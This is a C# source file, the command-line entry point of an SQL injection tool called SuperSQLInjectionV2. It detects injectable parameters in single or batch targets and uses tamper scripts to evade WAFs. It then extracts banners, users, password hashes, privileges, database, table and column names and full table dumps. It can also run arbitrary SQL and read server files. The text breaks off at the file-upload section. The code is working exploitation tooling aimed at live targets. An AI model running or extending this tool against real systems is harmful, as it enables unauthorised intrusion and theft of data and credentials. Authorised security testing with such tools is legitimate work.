using CommunityToolkit.Mvvm.Messaging;
using SuperSQLInjectionV2.Bypass;
using SuperSQLInjectionV2.Models;
using SuperSQLInjectionV2.Models.Data;
using SuperSQLInjectionV2.Msg;
using SuperSQLInjectionV2.Payload;
using SuperSQLInjectionV2.Tools;
using SuperSQLInjectionV2.Tools.Http;
using SuperSQLInjectionV2.Tools.Inject;
using SuperSQLInjectionV2.ViewModels;
using SuperSQLInjectionV2.ViewModels.Tools;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Reflection;
using System.Text;

namespace SuperSQLInjectionV2.Cmd;

/// <summary>
/// SuperSQLInjectionV2.Cmd — SuperSQLInjectionV2 命令行版入口。
/// 复用主库检测引擎（InjectDetectEngine）与取数链路（DataComm/PayloadFactory/VersTools/DataTools/FileCmdTools），
/// 日志经 ConsoleLogSink 输出，全程无 UI 依赖。
/// </summary>
public static class Program
{
    /// <summary>版本号（ConstData 为 internal，CLI 读程序集信息版本）</summary>
    public static string AppVersion =>
        Assembly.GetExecutingAssembly().GetCustomAttribute<AssemblyInformationalVersionAttribute>()?.InformationalVersion ?? "2.0.2";

    /// <summary>--selftest 探针：自定义 JS 项强制走 QuickJS 池化执行（非内置 C# 委托），验证原生库加载与 eval 链路</summary>
    private sealed class SelfTestTamper : ITamperItem
    {
        public string Name => "selftest";
        public bool Builtin => false;
        public string? Key => null;
        public string? Code => "function tamper(p){ return 'qjs:' + p + ':' + (1+1); }";
    }

    public static async Task<int> Main(string[] args)
    {
        Console.OutputEncoding = Encoding.UTF8;
        //注册GB18030/GB2312等代码页编码提供程序（页面编码解析/报文文件读取依赖）
        Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
        LogTools.Headless = true;
        Log.Sink = new ConsoleLogSink();

        CliOptions opt;
        try
        {
            opt = CliOptions.Parse(args);
        }
        catch (ArgumentException e)
        {
            Console.Error.WriteLine("参数错误: " + e.Message);
            Console.Error.WriteLine("用 -h 查看帮助");
            return 2;
        }

        if (opt.ShowVersion)
        {
            Console.WriteLine("SuperSQLInjectionV2.Cmd v" + AppVersion);
            return 0;
        }

        if (opt.SelfTest)
        {
            // 自检：真实加载 libquickjs 原生库并执行一段 JS（--version 不触碰 QuickJS，CI 冒烟需覆盖原生库加载链路）
            try
            {
                string r = ScriptTamperEngine.TamperStrict(new SelfTestTamper(), "ok");
                if (r == "qjs:ok:2")
                {
                    Console.WriteLine("selftest: QuickJS OK (" + r + ")");
                    return 0;
                }
                Console.Error.WriteLine("selftest: QuickJS 返回不符预期: " + r);
                return 1;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("selftest: QuickJS 加载/执行失败: " + e.Message);
                return 1;
            }
        }
        if (opt.ShowHelp || args.Length == 0)
        {
            Console.WriteLine(CliOptions.HelpText);
            return args.Length == 0 && !opt.ShowHelp ? 2 : 0;
        }
        if (string.IsNullOrWhiteSpace(opt.Url) && string.IsNullOrWhiteSpace(opt.RequestFile) && string.IsNullOrWhiteSpace(opt.BatchFile))
        {
            Console.Error.WriteLine("缺少目标：用 -u 指定 URL、-r 指定请求报文文件或 -m 指定批量URL文件");
            return 2;
        }

        try
        {
            return await Run(opt);
        }
        catch (SuperSQLInjectionV2.Tools.Http.TargetUnreachableException e)
        {
            //目标不可达（连接拒绝/DNS失败/代理不可用）：快速失败，独立退出码便于脚本区分
            Log.Error("目标无法连接，终止检测: " + e.Message);
            return 4;
        }
        catch (OperationCanceledException e)
        {
            //用户停止/WAF拦截达阈值等主动中断：按正常结束处理（告警已在抛出前输出）
            Log.Warning("检测已中断: " + e.Message);
            return 2;
        }
        catch (Exception e)
        {
            Log.Error("运行异常: " + e.Message);
            return 3;
        }
    }

    private static async Task<int> Run(CliOptions opt)
    {
        //批量检测模式（-m/--batch-file）：URL列表逐目标检测（仅检测不取数）
        if (!string.IsNullOrWhiteSpace(opt.BatchFile))
        {
            return await RunBatch(opt).ConfigureAwait(false);
        }

        var tr = await DetectTarget(opt).ConfigureAwait(false);
        if (tr.Error != null)
        {
            Log.Error(tr.Error);
            return 2;
        }
        if (tr.Hits.Count == 0)
        {
            Log.Warning("未发现注入点。可提高 --level/--risk，或加 --no-smart 全量重测，或换个参数试试");
            return 1;
        }
        PrintReport(tr.Hits);
        if (!tr.Resumed)
        {
            SessionStore.Save(opt, tr.Config, tr.DisplayUrl, tr.RequestTxt, tr.Hits);
        }
        if (!opt.HasAction)
        {
            Log.Show("未指定取数动作（--dbs/--tables/--dump/--sql-query 等），检测结束");
            return 0;
        }
        AppConfig config = tr.Config;
        List<InjectPoint> allHits = tr.Hits;

        // ---------- 选择注入点并应用 ----------
        InjectPoint best = PickBest(allHits, opt);
        Log.Highlight($"采用注入点: {best.PName}（{TypeName(best)}，{best.DBType}{ForkSuffix(best)}）");
        foreach (var h in allHits)
        {
            InjectChannelRegistry.Register(config.Host, config.Port, new InjectRecord
            {
                Target = config.Host + ":" + config.Port,
                PName = h.PName ?? "",
                DBType = h.DBType,
                InjectType = h.InjectType,
                BoolInjectType = h.BoolInjectType,
                CheckValue = h.CheckValue ?? "",
                Revers = h.Revers,
                SimilarTemplate = h.SimilarTemplate ?? "",
                SimilarMode = h.SimilarMode ?? "",
                SimilarCutoff = h.SimilarCutoff,
                DynamicFeatures = h.DynamicFeatures,
                SumColumnCount = h.SumColumnCount,
                ShowColumnIndex = h.ShowColumnIndex,
                RequestTxt = h.RequestTxt ?? ""
            });
        }
        ApplyHit(config, best);
        //fork化归一：检测命中的变体库型（金仓/openGauss/达梦）归一到族宿主+Fork名，取数=族模板+fork overlay
        var (fam0, fork0) = SuperSQLInjectionV2.Payload.DbProfile.ToFamilyFork(best.DBType);
        if (fam0 != best.DBType)
        {
            best.ForkName = string.IsNullOrEmpty(best.ForkName) ? fork0 : best.ForkName;
            best.DBType = fam0;
        }
        DBType dbType = best.DBType;
        if (dbType == DBType.UnKnow && !string.IsNullOrWhiteSpace(opt.Dbms))
        {
            dbType = ParseDbms(opt.Dbms!);
            //--dbms 指定变体库时同样归一到族+Fork名
            var (fam1, fork1) = SuperSQLInjectionV2.Payload.DbProfile.ToFamilyFork(dbType);
            if (fam1 != dbType)
            {
                best.ForkName = fork1;
                dbType = fam1;
            }
            config.DataConfig.SelectedDBType = dbType;
        }
        if (dbType == DBType.UnKnow)
        {
            Log.Error("未识别数据库类型，用 --dbms 指定后重试取数");
            return 1;
        }
        config.DataConfig.SelectedDBType = dbType;
        if (!string.IsNullOrEmpty(best.ForkName))
        {
            config.DataConfig.SelectedForkName = best.ForkName;
        }
        PayloadFactory.ForkName = config.DataConfig.SelectedForkName ?? "";
        PayloadFactory.Init(dbType);
        if (!string.IsNullOrWhiteSpace(opt.Dbms) && best.DBType != dbType)
            Log.Show($"--dbms 指定: {dbType}");

        //族→Fork精确识别（金仓/openGauss/达梦/MariaDB/TiDB等banner特征）：用户显式--dbms时尊重指定不纠偏
        if (string.IsNullOrWhiteSpace(opt.Dbms) && best.DBType != DBType.UnKnow)
        {
            var result = await SuperSQLInjectionV2.Tools.Inject.DbVariantResolver.ResolveAsync(config, best);
            if (!string.IsNullOrEmpty(result.ForkName) && result.ForkName != best.ForkName)
            {
                best.ForkName = result.ForkName;
                config.DataConfig.SelectedForkName = result.ForkName;
                PayloadFactory.ForkName = result.ForkName;
                PayloadFactory.Init(dbType);
                Log.Show($"Fork库识别: {dbType}({result.ForkName})");
                //fork识别后重新登记通道注册表，取数自动通道升级带上Fork名
                InjectChannelRegistry.Register(config.Host, config.Port, new InjectRecord
                {
                    Target = config.Host + ":" + config.Port,
                    PName = best.PName ?? "",
                    DBType = best.DBType,
                    ForkName = best.ForkName ?? "",
                    InjectType = best.InjectType,
                    BoolInjectType = best.BoolInjectType,
                    CheckValue = best.CheckValue ?? "",
                    Revers = best.Revers,
                    SimilarTemplate = best.SimilarTemplate ?? "",
                    SimilarMode = best.SimilarMode ?? "",
                    SimilarCutoff = best.SimilarCutoff,
                    DynamicFeatures = best.DynamicFeatures,
                    SumColumnCount = best.SumColumnCount,
                    ShowColumnIndex = best.ShowColumnIndex,
                    RequestTxt = best.RequestTxt ?? ""
                });
            }
        }

        // ---------- 执行动作 ----------
        await RunActions(opt, config, dbType, best);
        return 0;
    }

    // ================== 批量检测（-m/--batch-file） ==================

    /// <summary>
    /// 批量检测（对齐GUI批量检测与sqlmap -m）：URL列表逐行读取（#开头为注释，空行跳过，自动补http:// scheme并去重），
    /// 仅检测不取数；默认串行，--parallel 时多目标并发（并发度取 --threads 上限5）；
    /// 每目标独立配置/会话落盘 output/&lt;host&gt;_&lt;port&gt;/，末尾输出汇总报告；任一目标检出注入返回0
    /// </summary>
    private static async Task<int> RunBatch(CliOptions opt)
    {
        if (!File.Exists(opt.BatchFile!))
        {
            Log.Error("批量目标文件不存在: " + opt.BatchFile);
            return 2;
        }
        var urls = new List<string>();
        foreach (var raw in File.ReadAllLines(opt.BatchFile!))
        {
            string line = raw.Trim();
            if (line.Length == 0 || line.StartsWith('#'))
            {
                continue;
            }
            var uri = BatchDetectEngine.NormalizeUrl(line);
            if (uri == null)
            {
                Log.Warning("跳过非法URL: " + line);
                continue;
            }
            urls.Add(uri.ToString());
        }
        urls = urls.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
        if (urls.Count == 0)
        {
            Log.Error("批量文件中没有有效URL");
            return 2;
        }
        if (opt.HasAction)
        {
            Log.Warning("批量模式仅执行注入检测，取数动作已忽略（检出后可对单目标再执行取数）");
        }
        int maxPar = opt.Parallel ? Math.Clamp(opt.Threads, 1, 5) : 1;
        Log.Highlight($"批量检测开始：{urls.Count} 个目标（{(maxPar > 1 ? "并发=" + maxPar : "串行")}）");

        var results = new TargetResult?[urls.Count];
        var swAll = Stopwatch.StartNew();
        async Task One(int idx)
        {
            string url = urls[idx];
            var sw = Stopwatch.StartNew();
            Log.Highlight($"[{idx + 1}/{urls.Count}] ▶ {url}");
            try
            {
                var r = await DetectTarget(opt.CloneForUrl(url)).ConfigureAwait(false);
                r.Elapsed = sw.Elapsed;
                results[idx] = r;
            }
            catch (Exception e)
            {
                string reason = e switch
                {
                    TargetUnreachableException => "目标无法连接: " + e.Message,
                    OperationCanceledException => "检测中断: " + e.Message,
                    _ => "运行异常: " + e.Message
                };
                results[idx] = new TargetResult { DisplayUrl = url, Error = reason, Elapsed = sw.Elapsed };
            }
            var rr = results[idx]!;
            if (rr.Error != null)
            {
                Log.Error($"[{idx + 1}/{urls.Count}] {url} {rr.Error}");
            }
            else if (rr.Hits.Count > 0)
            {
                Log.Success($"[{idx + 1}/{urls.Count}] {url} 检出 {rr.Hits.Count} 个注入点（{HitSummary(rr.Hits)}）{(rr.Resumed ? "，会话复用" : "")}，耗时 {rr.Elapsed.TotalSeconds:F1}s");
            }
            else
            {
                Log.Show($"[{idx + 1}/{urls.Count}] {url} 未检出注入，耗时 {rr.Elapsed.TotalSeconds:F1}s");
            }
        }

        if (maxPar > 1)
        {
            using var gate = new SemaphoreSlim(maxPar);
            var tasks = Enumerable.Range(0, urls.Count).Select(async i =>
            {
                await gate.WaitAsync().ConfigureAwait(false);
                try
                {
                    await One(i).ConfigureAwait(false);
                }
                finally
                {
                    gate.Release();
                }
            }).ToList();
            await Task.WhenAll(tasks).ConfigureAwait(false);
        }
        else
        {
            for (int i = 0; i < urls.Count; i++)
            {
                await One(i).ConfigureAwait(false);
            }
        }

        // ---------- 汇总报告 ----------
        Console.WriteLine();
        Log.Success("========== 批量检测报告 ==========");
        int hitTargets = 0;
        for (int i = 0; i < urls.Count; i++)
        {
            var r = results[i]!;
            if (r.Error != null)
            {
                Console.WriteLine($"  [{i + 1}] {urls[i]}  失败（{r.Error}）");
            }
            else if (r.Hits.Count > 0)
            {
                hitTargets++;
                Console.WriteLine($"  [{i + 1}] {urls[i]}  注入点 {r.Hits.Count} 个（{HitSummary(r.Hits)}）{(r.Resumed ? "  会话复用" : "")}  {r.Elapsed.TotalSeconds:F1}s");
            }
            else
            {
                Console.WriteLine($"  [{i + 1}] {urls[i]}  未检出  {r.Elapsed.TotalSeconds:F1}s");
            }
        }
        Log.Show($"合计 {urls.Count} 个目标，{hitTargets} 个检出注入，总耗时 {swAll.Elapsed.TotalSeconds:F1}s；各目标会话已分别落盘 output/<host>_<port>/");
        return hitTargets > 0 ? 0 : 1;
    }

    /// <summary>单目标检测结果（批量汇总/单目标流程共用）</summary>
    private sealed class TargetResult
    {
        public AppConfig Config = null!;
        public string RequestTxt = "";
        public string DisplayUrl = "";
        public List<InjectPoint> Hits = [];
        /// <summary>致命错误消息（目标不可达/无参数等）；非空即失败</summary>
        public string? Error;
        /// <summary>会话复用命中（未实际发包检测，无需重复落盘）</summary>
        public bool Resumed;
        public TimeSpan Elapsed;
    }

    /// <summary>单目标检测报告（控制台）</summary>
    private static void PrintReport(List<InjectPoint> hits)
    {
        Console.WriteLine();
        Log.Success("========== 注入检测报告 ==========");
        foreach (var h in hits)
        {
            Console.WriteLine($"  参数: {h.PName}  类型: {TypeName(h)}  数据库: {h.DBType}{ForkSuffix(h)}" +
                              (h.InjectType == InjectType.Union ? $"  列数: {h.SumColumnCount} 显示位: {h.ShowColumnIndex}" : "") +
                              (h.InjectType == InjectType.Blind ? $"  判断: {h.BoolInjectType}" : ""));
        }
    }

    /// <summary>命中点概要：参数(类型,数据库) 列表（批量汇总行用）</summary>
    private static string HitSummary(List<InjectPoint> hits) =>
        string.Join("; ", hits.GroupBy(h => h.PName ?? "").Select(g =>
        {
            string types = string.Join("/", g.Select(h => TypeName(h)).Distinct());
            string dbs = string.Join("/", g.Select(h => h.DBType + ForkSuffix(h)).Where(d => !d.StartsWith("UnKnow", StringComparison.Ordinal)).Distinct());
            return g.Key + "(" + types + (dbs.Length > 0 ? "," + dbs : "") + ")";
        }));

    /// <summary>Fork库显示后缀（识别到衍生库时附加，如 MySQL(TiDB)）</summary>
    private static string ForkSuffix(InjectPoint h) => string.IsNullOrEmpty(h.ForkName) ? "" : $"({h.ForkName})";

    /// <summary>--technique 技术筛选（B布尔/E报错/U联合/T时间/S堆叠/D DNS外带；新检出与会话复用结果共用）</summary>
    private static List<InjectPoint> FilterByTechnique(List<InjectPoint> hits, string? technique)
    {
        if (string.IsNullOrWhiteSpace(technique))
        {
            return hits;
        }
        var allow = technique!.Select(LetterToType).Where(t => t != InjectType.UnKnow).ToHashSet();
        return hits.Where(h => allow.Contains(h.InjectType)).ToList();
    }

    /// <summary>
    /// 单目标检测全流程：配置→报文→会话复用（指纹匹配跳过检测）→参数发现→多技术检测→技术筛选；
    /// 异常上抛（单目标由Main归类退出码，批量由RunBatch记为该目标失败）
    /// </summary>
    private static async Task<TargetResult> DetectTarget(CliOptions opt)
    {
        var swDetect = Stopwatch.StartNew();
        // ---------- 配置 ----------
        var config = new AppConfig
        {
            TimeOut = opt.Timeout,
            RetryCount = opt.Retries,
            ThreadSize = Math.Clamp(opt.Threads, 1, 20),
            FollowRedirect = opt.FollowRedirects
        };
        config.ByPassConfig.DelayMs = opt.DelayMs;
        config.ByPassConfig.RandomUa = opt.RandomAgent;
        //规则库自动加载（config/rules/：自定义tamper/动态值脚本/动态规则/字符替换/代理池，与GUI共用同一套文件）
        RuleStore.LoadAll(config, opt.RulesDir);
        config.DataConfig.DetectLevel = Math.Clamp(opt.Level, 1, 5);
        config.DataConfig.DetectRisk = Math.Clamp(opt.Risk, 1, 3);
        config.DataConfig.SmartMode = !opt.NoSmart; //智能模式默认开：--smart 兼容保留（等同默认），--no-smart 关闭
        config.DataConfig.DetectExhaustive = opt.Exhaustive;
        config.DataConfig.DetectStopOnWaf = opt.StopOnWaf;
        //检出即停默认开：--keep-testing 关闭（完整画像场景）
        config.DataConfig.DetectStopOnHit = !opt.KeepTesting;
        config.DataConfig.HexDecode = opt.HexDecode;
        config.DataDump.DumpNoCast = opt.NoCast;
        if (!string.IsNullOrWhiteSpace(opt.Where)) config.DataDump.DumpWhere = opt.Where!;
        if (!string.IsNullOrWhiteSpace(opt.DnsDomain))
        {
            config.DataConfig.DetectDnsOob = true;
            config.DataConfig.DnsLogDomain = opt.DnsDomain!;
            if (!string.IsNullOrWhiteSpace(opt.DnsToken)) config.DataConfig.DnsLogApiToken = opt.DnsToken!;
        }

        // ---------- 请求报文 ----------
        string requestTxt;
        ParamPlace defaultPlace = ParamPlace.Query;
        if (!string.IsNullOrWhiteSpace(opt.RequestFile))
        {
            if (!File.Exists(opt.RequestFile)) { return new TargetResult { Error = "请求报文文件不存在: " + opt.RequestFile, Elapsed = swDetect.Elapsed }; }
            requestTxt = File.ReadAllText(opt.RequestFile).Replace("\r\n", "\n", StringComparison.Ordinal).Replace("\n", "\r\n", StringComparison.Ordinal);
            ApplyHostFromRequest(config, requestTxt);
        }
        else
        {
            requestTxt = BuildRequestFromUrl(config, opt);
            if (!string.IsNullOrWhiteSpace(opt.Data)) defaultPlace = ParamPlace.BodyForm;
        }

        // tamper 编码处理链
        if (!string.IsNullOrWhiteSpace(opt.Tamper)) ApplyTamper(config, opt.Tamper!);
        if (!string.IsNullOrWhiteSpace(opt.Proxy)) ApplyProxy(config, opt.Proxy!);

        //日志标注检测目标URL（-u 直接用原始URL；-r 报文模式由Host头+请求行重构）
        string displayUrl = !string.IsNullOrWhiteSpace(opt.Url) ? opt.Url!
            : (config.IsSSL ? "https" : "http") + "://" + config.Host
              + (config.Port is 80 or 443 ? "" : ":" + config.Port)
              + (requestTxt.Split("\r\n")[0].Split(' ') is { Length: >= 2 } rl ? rl[1] : "/");
        //回写config.Url：取数配置摘要等共享逻辑读取该字段，否则显示持久化配置里的旧目标
        config.Url = displayUrl;
        Log.Highlight($"目标URL: {displayUrl}");
        Log.Show($"检测配置: Level={config.DataConfig.DetectLevel} Risk={config.DataConfig.DetectRisk}" +
                 $"{(opt.Smart ? " Smart" : "")}{(string.IsNullOrWhiteSpace(opt.Technique) ? "" : " Technique=" + opt.Technique)}");

        // ---------- 会话复用（sqlmap session 同款：同目标+同报文+同检测参数免重复发包） ----------
        if (!opt.FlushSession && SessionStore.TryLoad(opt, config, requestTxt, out var resumedHits))
        {
            resumedHits = FilterByTechnique(resumedHits, opt.Technique);
            Log.Success($"会话指纹匹配，复用 {resumedHits.Count} 个已检出注入点，跳过重复检测（--flush-session 可强制重新检测）");
            return new TargetResult { Config = config, RequestTxt = requestTxt, DisplayUrl = displayUrl, Hits = resumedHits, Resumed = true, Elapsed = swDetect.Elapsed };
        }

        // ---------- 参数发现 ----------
        var candidates = DiscoverParams(config, requestTxt, defaultPlace, opt);
        if (candidates.Count == 0)
        {
            return new TargetResult { Error = "未发现可测试参数（用 -p 指定，或检查 URL/报文是否带参数）", Elapsed = swDetect.Elapsed };
        }
        Log.Show($"待检测参数: {string.Join(", ", candidates.Select(c => c.Name + "(" + c.Place + ")"))}");

        // ---------- 注入检测 ----------
        //检测日志全程带目标URL前缀（多目标/多参数并行日志归属一目了然；keepChannel保持原日志通道）
        IDisposable logScope = Log.PushScope(new PrefixLogSink("[" + displayUrl + "] ", Log.Sink, keepChannel: true));
        //跨参数信号共享会话：参数间共享命中boundary/命中库（优先排序非限定）
        var detectSession = new SuperSQLInjectionV2.Tools.Inject.DetectSessionState();
        var allHits = new List<InjectPoint>();
        if (opt.Parallel && candidates.Count > 1)
        {
            //多参数并行（与GUI「多参数并行」开关同源语义）：参数间上下文独立，并发度取 --threads（上限10）
            int maxPar = Math.Clamp(opt.Threads, 1, 10);
            Log.Show($"多参数并行检测已开启（并发={maxPar}）");
            using var gate = new SemaphoreSlim(maxPar);
            //检出即停（并行模式）：命中置位后，尚未启动的参数检测直接跳过；在飞参数自然跑完
            int parHitFound = 0;
            var tasks = candidates.Select(async c =>
            {
                await gate.WaitAsync().ConfigureAwait(false);
                try
                {
                    if (config.DataConfig.DetectStopOnHit && Volatile.Read(ref parHitFound) == 1)
                    {
                        return (c.Name, Hits: new List<InjectPoint>());
                    }
                    Log.Highlight($"▶ 检测参数 {c.Name} ...");
                    var hits = await InjectDetectEngine.DetectParam(config, requestTxt, c.Name, c.Value, c.Place, c.Header, c.UriIdx, detectSession).ConfigureAwait(false) ?? [];
                    foreach (var h in hits) h.PName ??= c.Name;
                    if (hits.Count > 0) Volatile.Write(ref parHitFound, 1);
                    return (c.Name, Hits: hits);
                }
                finally { gate.Release(); }
            }).ToList();
            foreach (var r in await Task.WhenAll(tasks).ConfigureAwait(false))
            {
                if (r.Hits.Count > 0)
                {
                    allHits.AddRange(r.Hits);
                    Log.Success($"参数 {r.Name} 检出 {r.Hits.Count} 个注入类型");
                }
                else
                {
                    Log.Show($"参数 {r.Name} 未检出注入");
                }
            }
        }
        else
        {
            foreach (var (name, value, place, header, uriIdx) in candidates)
            {
                Log.Highlight($"▶ 检测参数 {name} ...");
                var hits = await InjectDetectEngine.DetectParam(config, requestTxt, name, value, place, header, uriIdx, detectSession) ?? [];
                if (hits.Count > 0)
                {
                    foreach (var h in hits) h.PName ??= name;
                    allHits.AddRange(hits);
                    Log.Success($"参数 {name} 检出 {hits.Count} 个注入类型");
                    //检出即停（sqlmap同款默认行为）：已检出注入，停止其余参数检测
                    if (config.DataConfig.DetectStopOnHit)
                    {
                        Log.Show("已检出注入点，按「检出即停」设置停止对其余参数的检测（--keep-testing 可关闭）！");
                        break;
                    }
                }
                else
                {
                    Log.Show($"参数 {name} 未检出注入");
                }
            }
        }
        logScope.Dispose();

        // --technique 过滤
        allHits = FilterByTechnique(allHits, opt.Technique);
        return new TargetResult { Config = config, RequestTxt = requestTxt, DisplayUrl = displayUrl, Hits = allHits, Elapsed = swDetect.Elapsed };
    }

    // ================== 动作执行 ==================

    private static async Task RunActions(CliOptions opt, AppConfig config, DBType dbType, InjectPoint hit)
    {
        //取数动作前输出当前生效配置摘要（与GUI EnsureDataOpReady 成功路径同一实现，保持双端日志一致）
        MainViewViewModel.LogDataOpConfig(config, hit.InjectType);
        bool echo = hit.InjectType is InjectType.Union or InjectType.Error;

        async Task<string> GetData(string expr, int maxLen = 1024) => (hit.InjectType switch
        {
            InjectType.Union => await DataComm.DataDumpWithNoFrom(config, expr),
            InjectType.Error => await DataComm.DataDumpWithError(config, expr),
            InjectType.Stacked => await DataComm.GetStringByStacked(config, expr, maxLen),
            _ => await DataComm.GetStringByBool(config, expr, maxLen)
        }) ?? "";
        async Task<int> GetCount(string expr)
        {
            if (echo) { string v = await GetData(expr, 64); return int.TryParse((v ?? "").Trim(), out int n) ? n : -1; }
            return await DataComm.GetValueLen(config, expr, 0, 65535);
        }

        // ---- 环境变量类 ----
        if (opt.Banner || opt.CurrentUser || opt.CurrentDb || opt.Hostname || opt.IsDba || opt.AllEnv || opt.Passwords || opt.Privileges)
        {
            var vers = new ObservableCollection<VersModel>();
            var hash = new ObservableCollection<VersModel>();
            var priv = new ObservableCollection<VersModel>();
            VersTools.ReadVersByDBType(dbType, vers, hash, priv);
            IEnumerable<VersModel> picked;
            //--env 语义为"全部环境条目"：vers/hash/priv 三个分流集合合并执行，与 GUI 三个选项卡全选对齐
            if (opt.AllEnv) picked = vers.Concat(hash).Concat(priv).Distinct().ToList();
            else
            {
                var list = new List<VersModel>();
                void Pick(IEnumerable<VersModel> src, params string[] keys) =>
                    list.AddRange(src.Where(v => keys.Any(k => v.Name.Contains(k, StringComparison.OrdinalIgnoreCase))));
                if (opt.Banner) Pick(vers, "版本", "version()", "banner");
                if (opt.CurrentUser) Pick(vers, "用户", "user()");
                if (opt.CurrentDb) Pick(vers, "当前库", "当前数据", "database");
                if (opt.Hostname) Pick(vers, "主机", "host");
                if (opt.IsDba) Pick(hash, "DBA");
                if (opt.Passwords) list.AddRange(hash.Where(h => !list.Contains(h)));
                if (opt.Privileges) list.AddRange(priv);
                picked = list.Distinct();
            }
            Console.WriteLine();
            Log.Highlight("========== 环境信息 ==========");
            if (!picked.Any())
            {
                Log.Warning($"当前数据库 {dbType} 的环境变量模板中没有匹配所选项的条目（可试 --env 读取全部）");
            }
            foreach (var item in picked)
            {
                config.CheckStop();
                string v = await GetData(item.VerPayload);
                Console.WriteLine($"  {item.Name}: {v}");
            }
        }

        // ---- 枚举库 ----
        if (opt.Dbs)
        {
            Console.WriteLine();
            Log.Highlight("========== 数据库列表 ==========");
            List<string> dbs;
            if (IsLiteralPayload(PayloadFactory.BasePayload.DBNames))
            {
                //字面量库名模板（如 Access 单文件库 DBNames=Access）：无需发包直接返回
                dbs = [PayloadFactory.BasePayload.DBNames.Trim()];
            }
            else
            {
                dbs = await EnumerateNames(config, hit, GetData, GetCount,
                    PayloadFactory.BasePayload.DBCount,
                    PayloadFactory.BasePayload.DBNames,
                    i => PayloadFactory.BPTool.GetDBName(i));
            }
            foreach (var d in dbs) Console.WriteLine("  " + d);
            Log.Success($"共 {dbs.Count} 个库");
        }

        // ---- 枚举表 ----
        if (opt.Tables)
        {
            string db = RequireDb(opt, "--tables");
            Console.WriteLine();
            Log.Highlight($"========== 表列表（{db}） ==========");
            //Access 无元数据可读（msysobjects 默认拒绝）：走 exists 布尔字典猜解
            var tables = dbType == DBType.Access
                ? await DictGuessByBool(config, isTable: true)
                : await EnumerateNames(config, hit, GetData, GetCount,
                    PayloadFactory.BPTool.GetTableCount(db),
                    PayloadFactory.BPTool.GetTableNames(db),
                    i => PayloadFactory.BPTool.GetTableName(db, i));
            foreach (var t in tables) Console.WriteLine("  " + t);
            Log.Success($"共 {tables.Count} 张表");
        }

        // ---- 枚举字段 ----
        List<string>? dumpCols = null;
        if (opt.Columns || (opt.Dump && string.IsNullOrWhiteSpace(opt.ColumnList)))
        {
            string db = RequireDb(opt, "--columns");
            string table = RequireTable(opt, "--columns");
            if (opt.Columns)
            {
                Console.WriteLine();
                Log.Highlight($"========== 字段列表（{db}.{table}） ==========");
            }
            //Access：字段名同样走 exists 布尔字典猜解
            dumpCols = dbType == DBType.Access
                ? await DictGuessByBool(config, isTable: false, table)
                : await EnumerateNames(config, hit, GetData, GetCount,
                    PayloadFactory.BPTool.GetColumnCount(db, table),
                    PayloadFactory.BPTool.GetColumnNames(db, table),
                    i => PayloadFactory.BPTool.GetColumnName(db, table, i));
            if (opt.Columns)
            {
                foreach (var c in dumpCols) Console.WriteLine("  " + c);
                Log.Success($"共 {dumpCols.Count} 个字段");
            }
            else
            {
                Log.Show($"字段枚举: {string.Join(", ", dumpCols)}");
            }
        }

        // ---- dump ----
        if (opt.Dump)
        {
            string db = RequireDb(opt, "--dump");
            string table = RequireTable(opt, "--dump");
            List<string> cols = !string.IsNullOrWhiteSpace(opt.ColumnList)
                ? opt.ColumnList!.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries).ToList
                (): dumpCols ?? [];
            if (cols.Count == 0)
            {
                Log.Error("dump 需要列：用 -C 指定，或先 --columns 枚举");
                return;
            }
            config.DataDump.DataDumpStart = Math.Max(0, opt.Start - 1);
            config.DataDump.DumpCount = opt.Stop ?? 0; // 0 时由行数检查兜底
            Console.WriteLine();
            Log.Highlight($"========== 导出数据（{db}.{table}，列: {string.Join(",", cols)}） ==========");

            var rows = new List<DynamicDataItem>();
            WeakReferenceMessenger.Default.Register<List<DynamicDataItem>, AddRowDataMsg>(rows, (r, m) => r.Add(m.Data));

            var dt = new DataTools(db, table, cols);
            // DumpCount=0 时先取行数兜底
            if (config.DataDump.DumpCount <= 0)
            {
                int cnt = await GetCount(PayloadFactory.BPTool.GetDataCount(db, table, config.DataDump.DumpWhere));
                config.DataDump.DumpCount = cnt;
                Log.Show($"表 {table} 共 {cnt} 行");
            }
            Task dumpTask = hit.InjectType switch
            {
                InjectType.Union => dt.GetDataUnion(config),
                InjectType.Error => dt.GetDataError(config),
                _ => dt.GetDataByBool(config)
            };
            await dumpTask;
            WeakReferenceMessenger.Default.Unregister<AddRowDataMsg>(rows);

            PrintTable(cols, rows);
            SaveDumpCsv(opt, config, db, table, cols, rows);
        }

        // ---- 自定义 SQL ----
        if (opt.SqlQuery != null)
        {
            Console.WriteLine();
            Log.Highlight("========== 自定义 SQL ==========");
            Console.WriteLine("  " + opt.SqlQuery);
            string result = await DataComm.RunUserSql(config, opt.SqlQuery);
            Console.WriteLine("结果: " + result);
        }

        // ---- 文件读取 ----
        if (opt.FileRead != null)
        {
            Console.WriteLine();
            Log.Highlight($"========== 文件操作-读取: {opt.FileRead} ==========");
            var vm = new FileCmdViewModel(config);
            vm.RefreshFileMethods(dbType);
            string? method = string.IsNullOrWhiteSpace(opt.FileMethod)
                ? vm.FileMethods.FirstOrDefault(m => m.Contains("读文件", StringComparison.Ordinal))
                : MatchMethod(vm.FileMethods, opt.FileMethod!);
            if (method == null) { Log.Error($"当前数据库 {dbType} 不支持文件读取" + (string.IsNullOrWhiteSpace(opt.FileMethod) ? "" : $"（无匹配方式[{opt.FileMethod}]，可用：{string.Join(" / ", vm.FileMethods)}）")); }
            else
            {
                vm.SelectedFileMethod = method;
                vm.FilePath = opt.FileRead;
                Log.Show($"方式: {method}");
                await FileCmdTools.ExecuteFile(config, vm);
                if (method.Contains("二进制下载", StringComparison.Ordinal))
                {
                    //二进制下载：必须 --file-dest 指定本地保存路径，字节直接落盘
                    if (string.IsNullOrWhiteSpace(opt.FileDest)) { Log.Error("二进制下载需要 --file-dest 指定本地保存路径"); }
                    else if (vm.FileBytes == null || vm.FileBytes.Length == 0) { Log.Error("二进制下载结果为空（详见上方日志）"); }
                    else
                    {
                        File.WriteAllBytes(opt.FileDest!, vm.FileBytes);
                        Log.Success($"已保存: {opt.FileDest}（{vm.FileBytes.Length}字节）");
                    }
                }
                else if (!string.IsNullOrEmpty(vm.FileContent)) Console.WriteLine(vm.FileContent);
            }
        }

        // ---- 文件上传 ----
        if (opt.FileWrite != null)
        {
